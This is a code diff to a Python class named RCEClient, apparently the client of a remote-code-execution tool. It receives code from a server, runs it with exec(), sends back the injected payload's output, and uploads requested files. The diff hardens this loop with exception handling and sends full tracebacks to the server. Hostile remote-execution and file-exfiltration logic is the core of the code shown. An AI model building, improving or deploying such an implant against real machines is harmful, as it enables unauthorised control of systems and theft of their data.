@@ -1,4 +1,5 @@
 import sys
+import traceback
 from pathlib import Path
 
 from src.core.base_client import BaseClientThread
@@ -49,18 +50,18 @@ class RCEClient(BaseClientThread):
                     self.send_file(filename)
                     self.__logger.debug(f"File '{filename}' sent")
                 elif message.is_type(MessageType.INJECT):
-                    self.__logger.debug(f"inject from {message.get_sender()}:\n\t{message}")
+                    self.__logger.debug(f"injecting:\n\t{message}")
                     self.inject_payload(message)
                 elif message.is_type(MessageType.EXECUTE):
-                    self.__logger.debug(f"execute from {message.get_sender()}:\n\t{message}")
+                    self.__logger.debug(f"executing:\n\t{message}")
                     self.execute_payload()
                 elif message.is_type(MessageType.ERROR):
-                    self.__logger.debug(f"error from {message.get_sender()}:\n\t{message}")
+                    self.__logger.debug(f"error:\n\t{message}")
                 else:
-                    self.__logger.debug(f"Unknown message type from {message.get_sender()}: {message.get_type()}")
+                    self.__logger.debug(f"Unknown message type: {message.get_type()}")
             except (FileNotFoundError, MessageTypeError, FileWriteError, FileReadError) as e:
                 self.__logger.error(e)
-                self.send_message(Message(message_type=MessageType.ERROR, data=e.args[0].encode()))
+                self.send_message(Message(message_type=MessageType.ERROR, data=traceback.format_exc().encode()))
             except OSError as e:
                 self.close()
                 self.__logger.error("DISCONNECTED from server")
@@ -87,20 +88,32 @@ class RCEClient(BaseClientThread):
         """
         received_payload = message.data
         self.__logger.debug("Injecting payload:\n" + received_payload.decode())
-        exec(received_payload, locals(), globals())
-        setattr(RCEClient, "payload", getattr(sys.modules[__name__], "payload"))
-        self.__logger.debug("Injected payload")
-        self.send_message(Message(message_type=MessageType.ECHO, data=b"Payload injected"))
+        try:
+            exec(received_payload, locals(), globals())
+            setattr(RCEClient, "payload", getattr(sys.modules[__name__], "payload"))
+            self.__logger.debug("Injected payload")
+            self.send_message(Message(message_type=MessageType.ECHO, data=b"Payload injected"))
+        except AttributeError as e:
+            self.__logger.error(e)
+            self.send_message(Message(MessageType.ERROR, traceback.format_exc().encode()))
 
     def execute_payload(self):
         """
         Executes the payload and sends its output back to the server.
         :raises: OSError: If an error occurs while sending the output back to the server.
         """
-        if not (output := self.payload()):
-            return
+        # noinspection PyBroadException
+        try:
+            if not (output := self.payload()):
+                return
 
-        output = str(output)
-        self.__logger.debug(f"Output from payload execution:\n{output}")
-        message = Message(message_type=MessageType.ECHO, data=output.encode())
-        self.send_message(message)
+            output = str(output)
+            self.__logger.debug(f"Output from payload execution:\n{output}")
+            self.send_message(
+                Message(message_type=MessageType.ECHO, data=output.encode()))
+        except OSError:
+            self.__logger.error("Connection closed by peer")
+        except Exception as e:
+            self.__logger.debug(e)
+            self.send_message(
+                Message(message_type=MessageType.ERROR, data=traceback.format_exc().encode()))
